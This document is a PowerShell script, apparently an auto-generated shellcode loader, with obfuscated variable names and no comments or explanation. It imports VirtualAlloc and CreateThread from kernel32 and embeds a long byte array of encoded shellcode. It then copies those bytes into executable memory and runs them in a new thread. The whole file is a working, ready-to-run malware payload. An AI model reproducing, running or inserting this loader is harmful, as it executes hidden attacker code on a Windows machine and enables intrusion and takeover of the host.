$eOwidXXHPDkPd = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

$lJfOGHnzcg = Add-Type -memberDefinition $eOwidXXHPDkPd -Name "Win32" -namespace Win32Functions -passthru

[Byte[]] $phtfyXjjuVKmz = 0xba,0x4e,0x13,0x23,0xf3,0xd9,0xcf,0xd9,0x74,0x24,0xf4,0x58,0x31,0xc9,0x66,0xb9,0x96,0x1,0x83,0xe8,0xfc,0x31,0x50,0x13,0x3,0x50,0x13,0xe2,0xbb,0xca,0xe5,0x2a,0x37,0xc9,0x1d,0x96,0x9c,0xd8,0x61,0xa7,0x5a,0x7d,0x98,0xce,0x23,0xd,0xa2,0x8d,0xb9,0xee,0x94,0xeb,0x2a,0xc,0xad,0x1c,0x36,0x5f,0x2c,0xf9,0xd,0x85,0x68,0xec,0xf1,0xa6,0x72,0xb,0xaf,0x6b,0x12,0x6d,0xb7,0x6f,0x12,0x10,0xc0,0x83,0xe0,0xa3,0x16,0x5e,0x1f,0x2f,0xe9,0xe2,0x32,0x7a,0xc0,0x55,0x26,0xfb,0x54,0x3e,0xc3,0x4a,0xf3,0xbe,0x1,0x5,0x1e,0x17,0x85,0xcd,0x66,0x6c,0xc6,0x34,0x6e,0xff,0x6e,0x9b,0x6c,0x57,0x18,0xd6,0x90,0x98,0x13,0xd9,0xc8,0x1d,0x80,0x71,0x4d,0x56,0x19,0x30,0x94,0x3,0xfb,0x9a,0x8a,0x28,0xd7,0x5b,0xe5,0x48,0x1e,0xbc,0xe5,0x6c,0x19,0x30,0x2e,0x58,0xc1,0x83,0xd,0x7e,0x71,0x5d,0x37,0x65,0x75,0xfa,0x14,0x27,0x6d,0xd8,0x50,0x13,0x69,0x9e,0x1a,0x3,0xfb,0x78,0x73,0x3c,0x18,0x23,0x88,0x68,0x3e,0x7d,0x68,0x59,0x7c,0xad,0x87,0xb2,0xe4,0xd5,0x2,0x92,0xc0,0x48,0xa8,0xf5,0x65,0xf0,0xf9,0x13,0x1b,0xcd,0x84,0xa1,0xe2,0xc,0xd7,0x1f,0x96,0x3c,0x4e,0x69,0xd7,0x4,0x1d,0x7e,0xcd,0x1e,0xad,0x54,0x8f,0x58,0x55,0xb8,0x22,0xe,0x70,0xea,0xcb,0xe6,0xe1,0x74,0x87,0x3b,0xcc,0x55,0xa3,0x52,0x3d,0xe2,0x81,0x7a,0x69,0x5,0xdb,0x5e,0xb9,0xf9,0xab,0xa3,0x77,0x9b,0xcf,0x84,0x1f,0xf,0xcb,0xc1,0x1e,0x5b,0xdb,0x83,0xe,0xa0,0xb8,0x4c,0xc4,0x5f,0xfd,0xcb,0x84,0xff,0x8,0xbe,0xd0,0x90,0x73,0x2,0x7c,0xe8,0xf,0x4a,0xb1,0x20,0x45,0x8b,0x60,0x7b,0x55,0xb0,0x9b,0xc4,0x24,0x7f,0x2,0xc6,0x7b,0xbd,0x33,0xb2,0x26,0x9b,0x90,0x90,0x4,0x34,0x23,0x10,0xc1,0x59,0x66,0x11,0x5b,0x6b,0x95,0xa6,0x71,0x96,0xb,0x5d,0xdb,0x72,0xa5,0x51,0x8d,0xb1,0xcf,0x4c,0x43,0x76,0x98,0x97,0xf6,0x4,0xaf,0x20,0xcf,0x0,0x3e,0x12,0xe0,0xad,0x5,0x9a,0x70,0x4f,0x49,0x96,0x52,0x60,0x49,0xb6,0x10,0x15,0xda,0x15,0xf2,0xf,0x37,0x85,0x9e,0x9c,0x25,0x7d,0x28,0x2c,0x39,0xfc,0x75,0xc8,0x57,0x96,0x39,0xb7,0x4e,0xf1,0x51,0xd,0xa6,0x32,0xdb,0x6c,0x87,0x62,0xdd,0xf3,0x11,0xd9,0xe2,0x1a,0x39,0x53,0x6a,0x6c,0x4e,0x51,0xc4,0x52,0x60,0x1d,0xa2,0xa6,0xa1,0x77,0x9e,0x32,0xa0,0xac,0xac,0xa3,0x2c,0x2c,0xf7,0xa7,0xef,0xcf,0x84,0x45,0x5,0xc2,0x49,0x18,0xf5,0x10,0x51,0x9e,0x79,0xcf,0x5b,0x2b,0x21,0x45,0xea,0x43,0xe1,0xeb,0x46,0xb7,0x6,0xf9,0x4a,0x5f,0xf0,0x7c,0xf5,0xba,0xaf,0xba,0x83,0x61,0xe0,0xeb,0x43,0xfe,0x92,0xc3,0xfb,0x3,0xbf,0x24,0xaa,0x81,0x27,0x96,0xb2,0x29,0x89,0x6f,0xb3,0x18,0x5e,0x9b,0xa7,0x56,0x39,0xed,0x7b,0x51,0xb0,0xde,0x89,0xa6,0xd3,0x9d,0xb3,0x66,0xe0,0xc7,0xd2,0xb5,0xf7,0x9,0xd9,0x43,0xe1,0x65,0xac,0x5b,0x71,0x67,0x79,0x4,0xe7,0xb1,0x40,0xae,0x71,0xe9,0xe9,0xa9,0x71,0x43,0x1d,0xc4,0xee,0x24,0xef,0xd4,0xb0,0xdd,0xb6,0x73,0xeb,0x2b,0xd2,0x7a,0xe1,0x81,0x9a,0xd4,0xe9,0x2e,0x88,0xe7,0x82,0xfa,0x99,0x74,0x88,0xc0,0xae,0xee,0x2f,0xc1,0x39,0x79,0xac,0x99,0x82,0x59,0x8d,0x14,0xdc,0x3c,0xd7,0xf3,0xd0,0x4,0x1d,0xc5,0x19,0x2b,0xd7,0xae,0xdf,0xb9,0xbf,0x91,0x47,0x78,0xa8,0x97,0xe7,0x84,0xe2,0x19,0x96,0xde,0x75,0x72,0x2f,0x10,0x72,0x2,0xfd,0x56,0x97,0xda,0x61,0xbe,0x75,0x23,0xb5,0x9d,0x17,0xd5,0x31,0x6,0xa9,0x99,0xeb,0x6a,0x56,0xf0,0x30,0xa1,0x96,0x9,0xc,0x9a,0x80,0xc8,0xf2,0xd6,0xb1,0x9e,0x2f,0xd,0xa5,0xcd,0x1d,0x93,0x2d,0x19,0xf5,0xca,0x1a,0xf2,0xd3,0xf1,0x1c,0x6f,0xc8,0x1c,0x50,0xb8,0x72,0x27,0x94,0x3a,0x8b,0xc6,0x5a,0xcd,0x92,0x45,0x8b,0x7a,0x30,0x7d,0xcf,0xf2,0xa,0xc7,0xdf,0x41,0x3e,0xc9,0x18,0xc0,0x28,0x91,0x61,0x81,0xf8,0x6c,0x48,0x13,0x5f,0x8d,0x68,0xa3,0xfc,0xb7,0xf8,0x80,0x68,0xee,0xa8,0xe5,0x1e,0x75,0xf0,0x64,0x26,0x5f,0xc5,0x2,0x63,0x24,0x1,0x95,0x55,0xbc,0x53,0x99,0xab,0xf9,0xc9,0xa5,0x65,0x64,0xbc,0x97,0xb7,0x7,0xb3,0x31,0xd6,0xea,0x3f,0x6f,0x2a,0xa5,0xa,0xda,0xc8,0x36,0x27,0xa,0x87,0x45,0xb,0xa4,0xa3,0xb1,0xb4,0x99,0x84,0x1c,0x42,0xd2,0x43,0xd6,0xbe,0xf5,0x8c,0x93,0xb5,0xa8,0x70,0xaf,0x60,0xce,0x2e,0x0,0xfa,0xad,0x6,0x51,0xcc,0xd2,0xb7,0xae,0x55,0x12,0xab,0x9a,0x3f,0xc7,0x4,0x5a,0x96,0x6a,0xa0,0xd4,0x80,0x13,0xdb,0xef,0xe8,0x1f,0xf7,0x32,0x9c,0xd1,0xf3,0xee,0xa3,0xb0,0xa0,0x91,0x48,0x7c,0x60,0xc9,0xe6,0x4,0x87,0x1d,0x2,0x95,0xc9,0x32,0x24,0xf7,0xe9,0x4c,0x5,0x43,0xa2,0x7,0x7e,0xd5,0x87,0x6b,0x97,0xb0,0x6d,0x76,0x34,0xce,0x1b,0xee,0xec,0xf6,0x6d,0x48,0xb,0x94,0x19,0xf4,0xe2,0x43,0xd9,0x70,0x67,0x89,0xef,0x34,0xe2,0xcd,0x46,0xc9,0x37,0x9b,0x1e,0xc2,0x8d,0xed,0xb8,0x82,0xa8,0x49,0x52,0xe7,0xec,0xf1,0x9c,0x38,0x86,0xf6,0xc4,0xe5,0x54,0x9a,0x7f,0x77,0xf7,0xed,0x73,0x2b,0x2e,0x5c,0x34,0x4b,0xbb,0x38,0x3a,0x9e,0x25,0x6f,0x2c,0xed,0x91,0xc4,0x24,0xe1,0xaf,0x48,0xb4,0x35,0x50,0x9b,0x18,0x8,0x1b,0xc4,0x39,0x15,0xfb,0x57,0x22,0xea,0x91,0xa8,0x21,0x9e,0x6,0x3a,0x11,0xf0,0x38,0x36,0xad,0x72,0x7c,0xf7,0x29,0x2f,0xea,0x36,0x78,0xbe,0x99,0x39,0x36,0x9,0x3d,0x5e,0x3c,0x42,0xe3,0x2c,0x3,0x20,0xd0,0xa0,0x4d,0x39,0xf7,0xd9,0x82,0xdb,0x80,0xa3,0xf0,0xd8,0x60,0x14,0x5f,0x64,0x9e,0x48,0xe0,0xc7,0xe4,0x2,0x49,0x48,0xb3,0x7f,0xf4,0x85,0xce,0x4c,0xc3,0xdd,0xf0,0x56,0xf8,0xa5,0xbc,0xa4,0xfa,0x2a,0xc5,0x26,0x23,0x28,0x50,0x74,0x43,0x31,0x77,0xce,0xc1,0xcf,0x39,0xf3,0xf7,0x29,0x5a,0x18,0x27,0x6,0xae,0xcd,0xb,0xf0,0x82,0xda,0x7e,0xa3,0x4e,0xf2,0x82,0xdb,0xe6,0x42,0x3d,0x71,0xb,0x95,0x9c,0x73,0x97,0x26,0xb7,0x98,0x4a,0x6c,0xcf,0xf8,0x5c,0xae,0xb1,0xc5,0x62,0x16,0x9c,0x23,0xf7,0x20,0x8b,0xa7,0x83,0xea,0xc9,0xed,0xef,0x16,0x1c,0x77,0xe5,0x5e,0x90,0xb0,0xfa,0xec,0x7f,0xa2,0xf3,0xa7,0xfb,0x1e,0x75,0x9c,0x20,0x5f,0x20,0xd4,0xf3,0x23,0x73,0xe0,0xb9,0x17,0xbf,0x5c,0x50,0xfa,0xff,0x39,0x7e,0x32,0x6a,0xfd,0x8a,0x6d,0x92,0x3c,0x44,0xd7,0x8b,0x50,0x27,0xa6,0xc0,0xb7,0x9a,0x66,0xc7,0xb0,0x77,0x6e,0xcb,0xd3,0xa3,0x1a,0xde,0xaf,0xbb,0xc5,0x4b,0xb5,0x6b,0xd0,0x38,0x79,0x19,0xa7,0xc5,0xb4,0x73,0xa4,0x29,0x3,0x92,0xd9,0xd6,0xe,0xad,0x26,0x98,0x49,0xa8,0x74,0x48,0xbd,0x7e,0xd7,0x29,0xd3,0x6,0x17,0x6b,0x41,0xac,0xce,0x5d,0xa,0x22,0xfe,0x50,0xb2,0x5c,0xd4,0x5b,0xe4,0x6f,0x3c,0x9c,0xe0,0x7f,0x5a,0x4c,0x2,0x86,0x6e,0xf2,0xae,0x8b,0xf1,0xdd,0x41,0xce,0x3d,0xa6,0x31,0xbc,0x73,0x2a,0x56,0xba,0xf9,0xfa,0x23,0x2c,0xa1,0x76,0x60,0xf6,0x2a,0x21,0x47,0xad,0x9b,0xfc,0x74,0xfd,0xd,0x7f,0x16,0x81,0x3b,0xf7,0x7,0xd8,0xba,0x15,0xba,0x54,0x88,0x30,0x70,0x7a,0x46,0x89,0xa3,0x76,0xa0,0x2,0x5c,0x49,0x72,0xda,0x89,0x3e,0xb6,0x9a,0xa0,0x76,0x7f,0xd6,0x70,0x16,0xf5,0x38,0xc9,0xc5,0x5c,0xae,0x56,0xcd,0xa9,0xa5,0x4e,0x83,0x23,0xbd,0x18,0xff,0x88,0xda,0x98,0xbb,0x75,0x7,0xed,0x24,0xa4,0x5e,0x99,0x4f,0xc2,0x36,0x72,0xf3,0x36,0x5c,0x9c,0x66,0x1,0x4a,0xcd,0x8a,0xd,0xbb,0x79,0xb0,0x78,0x3d,0xb5,0xd4,0xd3,0x7e,0xe5,0x58,0x5c,0x6e,0x91,0xc2,0x46,0x37,0xde,0x32,0x3a,0x89,0xb6,0x3c,0x7a,0xc5,0xff,0x9c,0x17,0x8e,0xf7,0xfb,0x86,0x9,0x6a,0x84,0xd7,0x6e,0x66,0xd9,0x37,0xf1,0x64,0x81,0x4e,0xbe,0x8a,0xb4,0x48,0x6b,0x57,0x39,0x9e,0x29,0x4e,0x55,0x94,0xb1,0x4b,0x8,0x98,0x1b,0xca,0xc1,0xb8,0xa6,0x9d,0x52,0xfa,0x56,0x18,0x68,0x7a,0x9c,0xb7,0xa6,0x79,0x36,0x78,0xd,0x4e,0x2b,0x3d,0x39,0x60,0x35,0xe2,0x41,0xc3,0x82,0x71,0x39,0x53,0x58,0xa6,0x7e,0x61,0xac,0xc2,0x42,0xc8,0x6a,0x9b,0x2,0x7a,0x4e,0x60,0xc5,0xb8,0x6b,0x84,0xe7,0xbe,0xaa,0x58,0x48,0xb6,0x52,0x3f,0x72,0x3c,0x10,0xd6,0x86,0xca,0xaa,0x49,0xc8,0x77,0x44,0x43,0x11,0x1c,0x61,0xa9,0xf6,0xd6,0x67,0x7d,0x8c,0x57,0xaa,0x2,0xb7,0xde,0xf2,0x1,0x45,0x60,0x78,0x94,0x0,0x46,0xe0,0x6a,0x88,0xdc,0xf2,0xd9,0xb2,0x21,0x55,0xbe,0x82,0x27,0x52,0x58,0xd6,0x29,0x40,0x26,0x3d,0xa9,0x83,0xb3,0x0,0xb5,0x81,0x2e,0x4,0xca,0xeb,0xb7,0xaa,0x5b,0x79,0x18,0x63,0x90,0x7e,0xa1,0xa,0xcf,0xf5,0xbe,0xaa,0x42,0xd4,0xe3,0x82,0x41,0x8,0x30,0xc3,0x4f,0x30,0x36,0x85,0x6,0x2a,0xdf,0xb0,0xeb,0x41,0xf8,0x68,0x47,0xd4,0x48,0x60,0x54,0x60,0x2a,0xe6,0x1d,0x6f,0x3e,0x6b,0xe6,0xd4,0xc8,0xa3,0x28,0x85,0x8b,0xdb,0xe4,0xd0,0x33,0xc4,0xb0,0x19,0xb2,0x14,0x65,0x7b,0x23,0xfc,0xa5,0xdc,0x5f,0xed,0x7f,0xb,0xdb,0xb,0xf2,0xeb,0x99,0x1,0x68,0x3c,0xe5,0xe6,0x46,0x13,0x5c,0x18,0x76,0xae,0xa7,0x90,0xac,0x34,0xde,0x8c,0xf5,0x8b,0x99,0xfa,0xc4,0xb5,0xe3,0xf8,0xdd,0xb2,0x66,0x7f,0x4,0xbc,0x78,0x3,0xd2,0x1b,0xa6,0xc5,0xb4,0xd0,0x1a,0xe2,0x93,0x8d,0xbc,0x76,0x5c,0xe0,0x59,0xcd,0xfb,0x4d,0x23,0x80,0xf1,0xac,0x84,0xed,0x75,0xff,0x5a,0xdd,0x15,0xc2,0xbe,0x53,0xd0,0xac,0x74,0x2,0x19,0x22,0x21,0xf4,0x6a,0x51,0x3e,0xe,0xc,0x9a,0xef,0x17,0x45,0x1a,0x6d,0x85,0x28,0xd2,0xb0,0xd9,0x4,0x9b,0x45,0x15,0x5,0x21,0xb0,0xb5,0x6b,0xaf,0xc,0x7f,0x4b,0x26,0xea,0x1b,0xaf,0x30,0x5d,0xa7,0x82,0x8e,0x73,0x76,0x13,0xfa,0x28,0x23,0x1c,0xc5,0x53,0xb9,0x48,0x62,0xca,0x4d,0x25,0x8c,0xd8,0xcf,0x59,0x58,0x99,0x55,0xa6,0x21,0x42,0xff,0x9c,0x48,0xe,0xee,0x36


$JiJqtrtpPyXLW = $lJfOGHnzcg::VirtualAlloc(0,[Math]::Max($phtfyXjjuVKmz.Length,0x1000),0x3000,0x40)

[System.Runtime.InteropServices.Marshal]::Copy($phtfyXjjuVKmz,0,$JiJqtrtpPyXLW,$phtfyXjjuVKmz.Length)

$lJfOGHnzcg::CreateThread(0,0,$JiJqtrtpPyXLW,0,0,0)